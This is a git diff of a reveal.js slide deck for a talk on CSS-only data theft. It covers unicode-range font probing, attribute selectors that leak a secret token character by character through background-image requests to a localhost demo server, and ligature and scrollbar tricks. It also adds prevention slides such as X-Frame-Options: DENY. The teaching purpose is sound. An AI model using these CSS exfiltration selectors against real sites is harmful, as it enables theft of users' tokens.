@@ -103,13 +103,15 @@
 				<p class="fragment">Who knows CSS?</p>
 				<p class="fragment">Who works on backend?</p>
 				<p class="fragment">Who does both very well?</p>
-				<img src="img/css3.png" style="max-width: 200px;" class="seamless" alt="">
-				<aside class="notes">
-					Let's start with a simple question first.
+				<aside class="notes"> Let's start with a simple question first.
 					<br>Who of you knows CSS very well? Hands up!
 					<br>Who of you works on the backend?
 					<br>Who does both very well?
 				</aside>
+			</section>
+
+			<section>
+				<img src="img/familyguycss.gif" width="800" class="seamless">
 			</section>
 
 			<section>
@@ -146,13 +148,30 @@
 					<span class=fragment>CSS Injection,</span>
 					<span class=fragment>Path Traversal,</span>
 					<span class=fragment>MitM,</span>
-					<span class=fragment>ARP spoofing,</span>
 					<span class=fragment>…</span>
 				</p>
 
 				<aside class="notes">
-					There are plenty of ways to inject CSS. You could exploit Path Traversal, Man in the Middle, ARP spoofing and so on
+					There's one assumption we need to make first: You're able to inject external CSS to the website
+					<br> There are plenty of ways to inject CSS. You could exploit Path Traversal, Man in the Middle, ARP spoofing and so on
+					<br>There's no need to inject JS, there's no need to attack the backend. Just CSS.
 				</aside>
+			</section>
+
+			<section>
+				<h2>OWASP Top 1 Application Security Risk – 2017</h2>
+				<ol class=fragment>
+					<li>Injection</li>
+				</ol>
+
+				<aside class="notes">
+					Before we begin, let's look at the numbers.
+					<br> Injection is the top security risk in web applications
+				</aside>
+			</section>
+
+			<section>
+				<img width="1000" src="img/begin.gif" class="seamless">
 			</section>
 
 			<section>
@@ -176,7 +195,7 @@
 			</section>
 
 			<section>
-				<h2>Just latin characters:</h2>
+				<h2>FONT-FACE</h2>
 				<pre><code class="css" data-trim>
 /* latin */
 @font-face {
@@ -186,9 +205,24 @@
   src: url(https://fonts.gstatic.com/…/roboto.woff2) format('woff2');
   unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215;
 }
+								</code></pre>
+				<aside class="notes">
+					This is how the font-face definition usually looks like.
+					<br> But I want you to focus on just the last property here. The unicode range.
+				</aside>
+			</section>
+
+			<section>
+				<h2>Just latin characters:</h2>
+				<pre><code class="css" data-trim>
+/* latin */
+@font-face {
+  src: url(roboto.woff2) format('woff2');
+  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215;
+}
 					</code></pre>
 				<aside class="notes">
-					This is how Google Fonts specify which font files should be used.
+					This piece of code is copied from Google Fonts.
 					<br>In this case, that specific file includes latin characters
 				</aside>
 			</section>
@@ -198,16 +232,14 @@
 				<pre><code class="css" data-trim>
 /* latin-ext */
 @font-face {
-  font-family: 'Roboto';
-  font-style: normal;
-  font-weight: 400;
-  src: url(https://fonts.gstatic.com/…/roboto-ext.woff2) format('woff2');
+  src: url(roboto2.woff2) format('woff2');
   unicode-range: U+0100-024F, U+1E00-1EFF, U+20A0-20AB, U+20AD-20CF, U+2C60-2C7F, U+A720-A7FF;
 }
 								</code></pre>
 				<aside class="notes">
 					Now let's imagine our website is in Polish.
 					<br> We need some latin-extended characters
+					<br> This way we specify another font file which contains only certain characters
 				</aside>
 			</section>
 
@@ -220,14 +252,18 @@
 
 			<section>
 				<h2>Why?</h2>
-				<p>For performance.</p>
-				<p>Only download fonts (characters) you need.</p>
-				<p>i.e. subpages in English, Polish and Arabic</p>
+				<p class="fragment">For performance.</p>
+				<p class="fragment">Only download fonts (characters) you need.</p>
+				<p class="fragment">i.e. subpages in English, Polish and Arabic</p>
 				<aside class="notes">
-					Why is this useful?
+					What's the motivation? Why is this useful?
 					<br> It helps optimize pages and applications.
 					<br> If your website is in English, Polish and Arabic you only download certain characters on specific subpages
 				</aside>
+			</section>
+
+			<section>
+				<h1>Cool?</h1>
 			</section>
 
 			<section>
@@ -245,13 +281,20 @@
 
 			<section>
 				<h2>DEMO</h2>
+
 				<a target="_blank" href="http://localhost:8000/demo1/vulnerablesite.html">site</a>
 				<br>
+				<a target="_blank" href="http://localhost:3000/first-pass.css">CSS</a>
+
 			</section>
 
 			<section>
 				<p>This way you narrowed down characters for bruteforcing the token</p>
 				<p>(or for another attack)</p>
+			</section>
+
+			<section>
+				<h1>How to prevent?</h1>
 			</section>
 
 			<section>
@@ -267,8 +310,12 @@
 			<section>
 				<h2>But wait, there's more!</h2>
 				<aside class="notes">
-					CSS has more features which can be used to attack your victims and still their data.
+					CSS has more "air quote" features which can be used to attack your victims and steal their data.
 				</aside>
+			</section>
+
+			<section>
+				<img src="img/flaw.gif" class="seamless" width="1000">
 			</section>
 
 			<section>
@@ -279,6 +326,11 @@
 				<h2>Selectors</h2>
 				<p class="fragment">Different scenario:</p>
 				<p class="fragment">You want to steal a token from input's attribute?</p>
+
+				<aside class="notes">
+					I'm going to teach you about CSS Selectors
+					<br>It's plain simple, isn't it?
+				</aside>
 			</section>
 
 			<section>
@@ -293,28 +345,52 @@
 			<section>
 				<pre><code class="css" data-trim>
 #secret-token[value^=0] {
-	background-image: url(http://localhost:3000/token/0);
+  background-image: url(http://localhost:3001/token/0);
 }
 				</code></pre>
 
-				<p>that + iframe + some node.js + refresh a few times = PWND</p>
+				<p class="fragment">that + iframe + some node.js + refresh a few times =
+					<span class="fragment">PWND</span>
+				</p>
 
 				<aside class="notes">
 					This selector matches secret-token for which its value attribute starts with 0
+					<br>So when the value starts with 0, the browser tries to download given background
+					<br>it issues a request to our server and now we know that the token starts with 0
 				</aside>
 			</section>
 
 			<section>
-				<h1>DEMO</h1>
-				<a target="_blank" href="http://localhost:8080/">Site</a>
-				<br>
-				<a target="_blank" href="http://localhost:3000/first-pass.css">CSS</a>
-				<br>
-				<a target="_blank" href="http://localhost:3000/iframe">attack</a>
+				<h2>Brilliant, huh?</h2>
 			</section>
 
+			<section>
+				<h1>DEMO</h1>
+				<a target="_blank" href="http://localhost:3002/">Site</a>
+				<br>
+				<a target="_blank" href="http://localhost:3001/first-pass.css">CSS</a>
+				<br>
+				<a target="_blank" href="http://localhost:3001/iframe">attack</a>
+			</section>
 
+			<section>
+				<h2>How to prevent?</h2>
+			</section>
 
+			<section>
+				<h3>Prevent from loading the app in iframes:</h3>
+				<p class="fragment">
+					Header
+					<br>
+					<code>X-Frame-Options: DENY</code>
+				</p>
+
+				<aside class="notes">
+					So first of all, don't allow loading your application in iframes.
+					<br>You can do that by specifying X-Frame-Options header in your response
+					<br>This makes all kinds attacks much harder
+				</aside>
+			</section>
 
 			<section>
 				<h1>Part 3</h1>
@@ -338,7 +414,9 @@
 			<section>
 				<h3>CSS fonts can define ligatures</h3>
 
-				<aside class="notes">So how can we use it for stealing someone's token?</aside>
+				<aside class="notes">
+					Do you know that webfonts can have ligatures?
+				</aside>
 			</section>
 
 			<section>
@@ -346,6 +424,17 @@
 					<li class="fragment">dynamically create a font</li>
 					<li class="fragment">define all characters 0px wide</li>
 					<li class="fragment">define certain ligature to be 10000px wide</li>
+				</ul>
+
+				<aside class="notes">
+					So how can we use it for stealing someone's token?
+				</aside>
+			</section>
+
+			<section>
+				<ul>
+					<li class="fragment">any characters -> not visible</li>
+					<li class="fragment">certain combination of chars -> 10000px</li>
 				</ul>
 			</section>
 
@@ -360,7 +449,7 @@
 			<section>
 				<pre><code class="css" data-trim>
 body::-webkit-scrollbar:horizontal {
-    background: url(http://localhost:3000/match);
+  background: url(http://localhost:3001/match);
 }
 				</code></pre>
 
@@ -392,12 +481,27 @@ body::-webkit-scrollbar:horizontal {
 					<li class="fragment">In this presentation I only injected CSS (never JS)</li>
 					<li class="fragment">We rarely think about securing our CSS</li>
 					<li class="fragment">CSS alone can be used for stealing data</li>
-					<li class="fragment">I hope you had some fun!</li>
 				</ul>
 			</section>
 
 			<section>
-				<h1>BONUS</h1>
+				<h2>Rules of thumb</h2>
+				<ul>
+					<li class="fragment">Think of making your CSS safe
+						<br>
+						<span class="fragment">(just like you do for JS)</span>
+					</li>
+					<li class="fragment">Disallow loading your app in iframes</li>
+				</ul>
+			</section>
+
+			<section>
+				<h3>I hope you had some fun!</h3>
+			</section>
+
+
+			<section>
+				<h1>one more thing…</h1>
 			</section>
 
 			<section>
